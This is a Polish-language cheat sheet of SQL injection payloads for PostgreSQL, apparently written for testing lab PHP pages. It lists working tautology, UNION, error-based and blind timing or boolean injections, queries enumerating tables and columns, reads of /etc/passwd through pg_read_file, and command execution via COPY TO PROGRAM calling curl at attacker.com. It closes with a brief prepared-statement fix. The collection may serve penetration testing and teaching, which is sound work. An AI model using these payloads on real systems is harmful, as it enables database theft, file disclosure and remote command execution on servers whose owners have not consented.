# Testowanie SQL Injection w PostgreSQL

## Podstawowe testy SQL Injection

### 1. Podstawowe SQLi
```
postgres-sqli.php?id=1
postgres-sqli.php?id=1' OR '1'='1
postgres-sqli.php?id=1' OR '1'='1'--
```

### 2. Union-based SQLi
```
postgres-sqli.php?id=1' UNION SELECT NULL, version(), NULL--
postgres-sqli.php?id=1' UNION SELECT NULL, current_user, NULL--
postgres-sqli.php?id=1' UNION SELECT NULL, current_database(), NULL--
```

### 3. Error-based SQLi
```
postgres-sqli.php?id=1' AND 1=CAST((SELECT version()) AS int)--
postgres-sqli.php?id=1' AND 1=CAST((SELECT 1/0) AS int)--
```

### 4. Time-based Blind SQLi
```
postgres-sqli.php?id=1' AND (SELECT pg_sleep(5))--
postgres-sqli.php?id=1' AND (SELECT pg_sleep(5) FROM pg_sleep(5))--
```

### 5. Boolean-based Blind SQLi
```
postgres-sqli.php?id=1' AND 1=1--
postgres-sqli.php?id=1' AND 1=2--
postgres-sqli.php?id=1' AND (SELECT SUBSTRING(version(),1,1))='P'--
```

## Zaawansowane testy PostgreSQL

### 6. Lista tabel
```
postgres-advanced.php?search=test' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
```

### 7. Lista kolumn
```
postgres-advanced.php?search=test' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### 8. Odczyt plików (wymaga superuser)
```
postgres-advanced.php?search=test' UNION SELECT NULL, pg_read_file('/etc/passwd'), NULL--
postgres-advanced.php?search=test' UNION SELECT NULL, pg_read_file('/etc/hosts'), NULL--
```

### 9. Wykonanie komend (wymaga superuser)
```
postgres-advanced.php?search=test'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/steal'--
```

### 10. Funkcje PostgreSQL do wykorzystania
- `version()` - wersja PostgreSQL
- `current_user` - aktualny użytkownik bazy
- `current_database()` - nazwa bazy danych
- `pg_read_file()` - odczyt plików systemowych
- `pg_sleep()` - opóźnienie (time-based blind)
- `information_schema.tables` - lista tabel
- `information_schema.columns` - lista kolumn
- `pg_ls_dir()` - lista katalogów
- `COPY ... TO PROGRAM` - wykonanie komend systemowych

## Przykłady payloadów

### Wykrycie wersji PostgreSQL
```
?id=1' UNION SELECT NULL, version(), NULL--
```

### Wykrycie aktualnego użytkownika
```
?id=1' UNION SELECT NULL, current_user, NULL--
```

### Wykrycie nazwy bazy danych
```
?id=1' UNION SELECT NULL, current_database(), NULL--
```

### Time-based blind SQLi
```
?id=1' AND (SELECT pg_sleep(5))--
```

### Boolean-based blind SQLi
```
?id=1' AND (SELECT SUBSTRING(version(),1,1))='P'--
?id=1' AND (SELECT SUBSTRING(current_user,1,1))='p'--
```

## Różnice między PostgreSQL a MySQL

1. **Komentarze**: PostgreSQL używa `--` (jak MySQL), ale też `/* */`
2. **Funkcje**: PostgreSQL ma więcej funkcji systemowych
3. **String concatenation**: PostgreSQL używa `||` zamiast `CONCAT()`
4. **LIMIT**: PostgreSQL używa `LIMIT` jak MySQL
5. **Information schema**: Podobny do MySQL, ale może mieć różnice

## Bezpieczne rozwiązanie

Użyj prepared statements:
```php
$stmt = pg_prepare($conn, "get_user", "SELECT * FROM users WHERE id = $1");
$result = pg_execute($conn, "get_user", array($id));
```

